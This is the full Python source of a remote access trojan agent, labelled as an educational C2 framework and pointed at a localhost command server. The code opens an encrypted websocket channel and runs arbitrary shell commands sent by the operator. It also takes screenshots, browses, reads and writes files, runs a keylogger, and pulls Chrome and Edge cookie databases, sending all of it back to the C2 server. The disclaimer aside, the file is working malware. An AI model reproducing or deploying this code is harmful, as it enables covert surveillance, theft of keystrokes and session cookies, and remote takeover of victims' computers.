#!/usr/bin/env python3
"""
C2 Framework - Advanced Agent with RAT Capabilities
⚠️ EDUCATIONAL PURPOSES ONLY - USE IN AUTHORIZED ENVIRONMENTS ONLY ⚠️
"""

import asyncio
import websockets
import json
import platform
import socket
import subprocess
import os
import sys
import base64
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import psutil
import time
import requests
from io import BytesIO

# Screenshot capability
try:
    from PIL import ImageGrab
    SCREENSHOT_AVAILABLE = True
except ImportError:
    SCREENSHOT_AVAILABLE = False
    print("[WARNING] PIL not available - screenshots disabled")

# Keylogger capability
try:
    from pynput import keyboard
    KEYLOGGER_AVAILABLE = True
except ImportError:
    KEYLOGGER_AVAILABLE = False
    print("[WARNING] pynput not available - keylogger disabled")

# Configuration
C2_SERVER = "ws://localhost:8001/api/ws"
API_SERVER = "http://localhost:8001/api"
AES_KEY = "ba4gd0qnveoxHglI4OL8n0jRAteGLexoWN2FbOH2zsU="
HEARTBEAT_INTERVAL = 30
RECONNECT_DELAY = 5

class AdvancedAgent:
    def __init__(self):
        self.node_id = None
        self.node_token = None
        self.websocket = None
        self.running = True
        self.registered = False
        self.keylogger_active = False
        self.keylog_buffer = []
        self.keylogger_listener = None
        
    def encrypt_message(self, plaintext: str) -> str:
        """Encrypt message with AES-256"""
        try:
            key = base64.b64decode(AES_KEY)
            cipher = AES.new(key, AES.MODE_CBC)
            ct_bytes = cipher.encrypt(pad(plaintext.encode('utf-8'), AES.block_size))
            iv = base64.b64encode(cipher.iv).decode('utf-8')
            ct = base64.b64encode(ct_bytes).decode('utf-8')
            return json.dumps({'iv': iv, 'ciphertext': ct})
        except Exception as e:
            print(f"[ERROR] Encryption failed: {e}")
            return ""
    
    def decrypt_message(self, encrypted: str) -> str:
        """Decrypt message from server"""
        try:
            data = json.loads(encrypted)
            key = base64.b64decode(AES_KEY)
            iv = base64.b64decode(data['iv'])
            ct = base64.b64decode(data['ciphertext'])
            cipher = AES.new(key, AES.MODE_CBC, iv)
            pt = unpad(cipher.decrypt(ct), AES.block_size)
            return pt.decode('utf-8')
        except Exception as e:
            print(f"[ERROR] Decryption failed: {e}")
            return ""
    
    def get_system_info(self):
        """Collect system information"""
        try:
            hostname = socket.gethostname()
            os_info = f"{platform.system()} {platform.release()}"
            try:
                ip = socket.gethostbyname(hostname)
            except:
                ip = "127.0.0.1"
            
            return {
                "hostname": hostname,
                "os": os_info,
                "ip": ip
            }
        except Exception as e:
            print(f"[ERROR] Failed to get system info: {e}")
            return {"hostname": "unknown", "os": "unknown", "ip": "0.0.0.0"}
    
    def register_node(self):
        """Register with C2 server"""
        try:
            system_info = self.get_system_info()
            response = requests.post(
                f"{API_SERVER}/nodes/register",
                json=system_info,
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                self.node_id = data['id']
                self.node_token = data['token']
                self.registered = True
                print(f"[SUCCESS] Registered with C2 - Node ID: {self.node_id}")
                return True
            else:
                print(f"[ERROR] Registration failed: {response.status_code}")
                return False
        except Exception as e:
            print(f"[ERROR] Registration exception: {e}")
            return False
    
    def execute_command(self, command: str) -> str:
        """Execute system command"""
        try:
            if sys.platform == "win32":
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
            else:
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
            
            output = result.stdout if result.stdout else result.stderr
            return output if output else "Command executed (no output)"
        
        except subprocess.TimeoutExpired:
            return "Command timeout exceeded"
        except Exception as e:
            return f"Execution error: {str(e)}"
    
    def take_screenshot(self) -> str:
        """Take screenshot and return as base64"""
        try:
            if not SCREENSHOT_AVAILABLE:
                return "ERROR: Screenshot capability not available"
            
            screenshot = ImageGrab.grab()
            buffer = BytesIO()
            screenshot.save(buffer, format='PNG', optimize=True, quality=50)
            img_base64 = base64.b64encode(buffer.getvalue()).decode()
            return img_base64
        except Exception as e:
            return f"Screenshot error: {str(e)}"
    
    def list_files(self, path: str = None) -> dict:
        """List files in directory"""
        try:
            if path is None:
                path = os.path.expanduser("~")
            
            if not os.path.exists(path):
                return {"error": "Path does not exist"}
            
            files = []
            dirs = []
            
            for item in os.listdir(path):
                item_path = os.path.join(path, item)
                try:
                    if os.path.isdir(item_path):
                        dirs.append({
                            "name": item,
                            "type": "dir",
                            "size": 0
                        })
                    else:
                        size = os.path.getsize(item_path)
                        files.append({
                            "name": item,
                            "type": "file",
                            "size": size
                        })
                except:
                    pass
            
            return {
                "path": path,
                "dirs": dirs,
                "files": files,
                "parent": os.path.dirname(path)
            }
        except Exception as e:
            return {"error": str(e)}
    
    def read_file(self, path: str) -> str:
        """Read file content as base64"""
        try:
            if not os.path.exists(path):
                return "ERROR: File does not exist"
            
            with open(path, 'rb') as f:
                content = f.read()
                return base64.b64encode(content).decode()
        except Exception as e:
            return f"Read error: {str(e)}"
    
    def write_file(self, path: str, content_base64: str) -> str:
        """Write file from base64 content"""
        try:
            content = base64.b64decode(content_base64)
            with open(path, 'wb') as f:
                f.write(content)
            return f"File written successfully: {path}"
        except Exception as e:
            return f"Write error: {str(e)}"
    
    def start_keylogger(self):
        """Start keylogger"""
        try:
            if not KEYLOGGER_AVAILABLE:
                return "ERROR: Keylogger not available"
            
            if self.keylogger_active:
                return "Keylogger already active"
            
            def on_press(key):
                try:
                    char = key.char if hasattr(key, 'char') else str(key)
                    self.keylog_buffer.append(char)
                    if len(self.keylog_buffer) > 1000:
                        self.keylog_buffer = self.keylog_buffer[-500:]
                except:
                    pass
            
            self.keylogger_listener = keyboard.Listener(on_press=on_press)
            self.keylogger_listener.start()
            self.keylogger_active = True
            return "Keylogger started"
        except Exception as e:
            return f"Keylogger error: {str(e)}"
    
    def stop_keylogger(self):
        """Stop keylogger"""
        try:
            if self.keylogger_listener:
                self.keylogger_listener.stop()
                self.keylogger_active = False
            return "Keylogger stopped"
        except Exception as e:
            return f"Stop error: {str(e)}"
    
    def get_keylog(self) -> str:
        """Get keylog buffer"""
        try:
            if not self.keylog_buffer:
                return "No keylog data"
            
            log = ''.join(self.keylog_buffer)
            self.keylog_buffer = []
            return log
        except Exception as e:
            return f"Get keylog error: {str(e)}"
    
    def steal_browser_cookies(self) -> dict:
        """Extract cookies from browsers"""
        cookies_data = {
            "chrome": [],
            "firefox": [],
            "edge": []
        }
        
        try:
            # Chrome cookies (Windows)
            if sys.platform == "win32":
                chrome_path = os.path.join(
                    os.environ.get('LOCALAPPDATA', ''),
                    'Google', 'Chrome', 'User Data', 'Default', 'Cookies'
                )
                
                if os.path.exists(chrome_path):
                    try:
                        import sqlite3
                        import shutil
                        
                        temp_path = os.path.join(os.environ['TEMP'], 'cookies_temp.db')
                        shutil.copy2(chrome_path, temp_path)
                        
                        conn = sqlite3.connect(temp_path)
                        cursor = conn.cursor()
                        cursor.execute("SELECT host_key, name, value FROM cookies LIMIT 100")
                        
                        for row in cursor.fetchall():
                            cookies_data["chrome"].append({
                                "domain": row[0],
                                "name": row[1],
                                "value": row[2][:50] + "..."
                            })
                        
                        conn.close()
                        os.remove(temp_path)
                    except Exception as e:
                        cookies_data["chrome"] = [{"error": str(e)}]
                
                # Edge cookies
                edge_path = os.path.join(
                    os.environ.get('LOCALAPPDATA', ''),
                    'Microsoft', 'Edge', 'User Data', 'Default', 'Cookies'
                )
                
                if os.path.exists(edge_path):
                    try:
                        import sqlite3
                        import shutil
                        
                        temp_path = os.path.join(os.environ['TEMP'], 'edge_cookies_temp.db')
                        shutil.copy2(edge_path, temp_path)
                        
                        conn = sqlite3.connect(temp_path)
                        cursor = conn.cursor()
                        cursor.execute("SELECT host_key, name, value FROM cookies LIMIT 100")
                        
                        for row in cursor.fetchall():
                            cookies_data["edge"].append({
                                "domain": row[0],
                                "name": row[1],
                                "value": row[2][:50] + "..."
                            })
                        
                        conn.close()
                        os.remove(temp_path)
                    except Exception as e:
                        cookies_data["edge"] = [{"error": str(e)}]
            
            # Linux/Mac Chrome
            elif sys.platform in ["linux", "darwin"]:
                home = os.path.expanduser("~")
                if sys.platform == "linux":
                    chrome_path = os.path.join(home, '.config', 'google-chrome', 'Default', 'Cookies')
                else:
                    chrome_path = os.path.join(home, 'Library', 'Application Support', 'Google', 'Chrome', 'Default', 'Cookies')
                
                if os.path.exists(chrome_path):
                    try:
                        import sqlite3
                        import shutil
                        
                        temp_path = '/tmp/cookies_temp.db'
                        shutil.copy2(chrome_path, temp_path)
                        
                        conn = sqlite3.connect(temp_path)
                        cursor = conn.cursor()
                        cursor.execute("SELECT host_key, name, value FROM cookies LIMIT 100")
                        
                        for row in cursor.fetchall():
                            cookies_data["chrome"].append({
                                "domain": row[0],
                                "name": row[1],
                                "value": row[2][:50] + "..."
                            })
                        
                        conn.close()
                        os.remove(temp_path)
                    except Exception as e:
                        cookies_data["chrome"] = [{"error": str(e)}]
            
        except Exception as e:
            return {"error": str(e)}
        
        return cookies_data
    
    def get_extended_sysinfo(self):
        """Get detailed system information"""
        try:
            cpu_percent = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            
            return {
                "node_id": self.node_id,
                "cpu_usage": cpu_percent,
                "memory_usage": memory.percent,
                "disk_usage": disk.percent,
                "processes": len(psutil.pids())
            }
        except Exception as e:
            print(f"[ERROR] Failed to get extended sysinfo: {e}")
            return None
    
    async def send_sysinfo(self):
        """Send system info to C2"""
        try:
            sysinfo = self.get_extended_sysinfo()
            if sysinfo:
                requests.post(f"{API_SERVER}/sysinfo", json=sysinfo, timeout=5)
        except Exception as e:
            print(f"[ERROR] Failed to send sysinfo: {e}")
    
    async def heartbeat_loop(self):
        """Send periodic heartbeat"""
        while self.running:
            try:
                if self.websocket and self.websocket.open:
                    message = json.dumps({"type": "heartbeat", "node_id": self.node_id})
                    encrypted = self.encrypt_message(message)
                    await self.websocket.send(encrypted)
                    await self.send_sysinfo()
                    
                await asyncio.sleep(HEARTBEAT_INTERVAL)
            except Exception as e:
                print(f"[ERROR] Heartbeat failed: {e}")
                await asyncio.sleep(HEARTBEAT_INTERVAL)
    
    async def handle_message(self, encrypted_message: str):
        """Handle incoming messages from C2"""
        try:
            decrypted = self.decrypt_message(encrypted_message)
            if not decrypted:
                return
            
            message = json.loads(decrypted)
            msg_type = message.get('type')
            
            if msg_type == 'command':
                command_id = message.get('command_id')
                command = message.get('command')
                
                print(f"[COMMAND] Executing: {command}")
                result = self.execute_command(command)
                
                response = json.dumps({
                    "type": "command_result",
                    "command_id": command_id,
                    "result": result,
                    "status": "executed"
                })
                encrypted = self.encrypt_message(response)
                await self.websocket.send(encrypted)
            
            elif msg_type == 'screenshot':
                print("[SCREENSHOT] Taking screenshot...")
                screenshot_data = self.take_screenshot()
                
                response = json.dumps({
                    "type": "screenshot_result",
                    "data": screenshot_data
                })
                encrypted = self.encrypt_message(response)
                await self.websocket.send(encrypted)
            
            elif msg_type == 'list_files':
                path = message.get('path')
                print(f"[FILES] Listing: {path}")
                files_data = self.list_files(path)
                
                response = json.dumps({
                    "type": "files_result",
                    "data": files_data
                })
                encrypted = self.encrypt_message(response)
                await self.websocket.send(encrypted)
            
            elif msg_type == 'read_file':
                path = message.get('path')
                print(f"[FILE] Reading: {path}")
                file_content = self.read_file(path)
                
                response = json.dumps({
                    "type": "file_content",
                    "path": path,
                    "content": file_content
                })
                encrypted = self.encrypt_message(response)
                await self.websocket.send(encrypted)
            
            elif msg_type == 'write_file':
                path = message.get('path')
                content = message.get('content')
                print(f"[FILE] Writing: {path}")
                result = self.write_file(path, content)
                
                response = json.dumps({
                    "type": "file_write_result",
                    "result": result
                })
                encrypted = self.encrypt_message(response)
                await self.websocket.send(encrypted)
            
            elif msg_type == 'start_keylogger':
                print("[KEYLOGGER] Starting...")
                result = self.start_keylogger()
                
                response = json.dumps({
                    "type": "keylogger_result",
                    "result": result
                })
                encrypted = self.encrypt_message(response)
                await self.websocket.send(encrypted)
            
            elif msg_type == 'stop_keylogger':
                print("[KEYLOGGER] Stopping...")
                result = self.stop_keylogger()
                
                response = json.dumps({
                    "type": "keylogger_result",
                    "result": result
                })
                encrypted = self.encrypt_message(response)
                await self.websocket.send(encrypted)
            
            elif msg_type == 'get_keylog':
                print("[KEYLOG] Retrieving...")
                keylog_data = self.get_keylog()
                
                response = json.dumps({
                    "type": "keylog_data",
                    "data": keylog_data
                })
                encrypted = self.encrypt_message(response)
                await self.websocket.send(encrypted)
            
            elif msg_type == 'steal_cookies':
                print("[COOKIES] Stealing browser cookies...")
                cookies = self.steal_browser_cookies()
                
                response = json.dumps({
                    "type": "cookies_data",
                    "data": cookies
                })
                encrypted = self.encrypt_message(response)
                await self.websocket.send(encrypted)
                
            elif msg_type == 'kill':
                print("[ALERT] Kill switch activated - Self destructing...")
                self.running = False
                if self.keylogger_active:
                    self.stop_keylogger()
                sys.exit(0)
            
            elif msg_type == 'ack':
                pass
                
        except Exception as e:
            print(f"[ERROR] Failed to handle message: {e}")
    
    async def connect_to_c2(self):
        """Maintain connection to C2 server"""
        while self.running:
            try:
                if not self.registered:
                    if not self.register_node():
                        print(f"[RETRY] Retrying registration in {RECONNECT_DELAY}s...")
                        await asyncio.sleep(RECONNECT_DELAY)
                        continue
                
                ws_url = f"{C2_SERVER}/{self.node_token}"
                print(f"[CONNECT] Connecting to C2 server...")
                
                async with websockets.connect(ws_url, ping_interval=20, ping_timeout=10) as websocket:
                    self.websocket = websocket
                    print("[SUCCESS] Connected to C2 server")
                    
                    heartbeat_task = asyncio.create_task(self.heartbeat_loop())
                    
                    try:
                        async for message in websocket:
                            await self.handle_message(message)
                    finally:
                        heartbeat_task.cancel()
                        
            except websockets.exceptions.WebSocketException as e:
                print(f"[ERROR] WebSocket error: {e}")
            except Exception as e:
                print(f"[ERROR] Connection error: {e}")
            
            if self.running:
                print(f"[RECONNECT] Reconnecting in {RECONNECT_DELAY}s...")
                await asyncio.sleep(RECONNECT_DELAY)
    
    def run(self):
        """Start the agent"""
        print("=" * 60)
        print("C2 Framework Advanced Agent - Starting...")
        print("=" * 60)
        
        try:
            asyncio.run(self.connect_to_c2())
        except KeyboardInterrupt:
            print("\n[EXIT] Agent stopped by user")
            self.running = False
            if self.keylogger_active:
                self.stop_keylogger()
        except Exception as e:
            print(f"[FATAL] Agent crashed: {e}")

if __name__ == "__main__":
    agent = AdvancedAgent()
    agent.run()
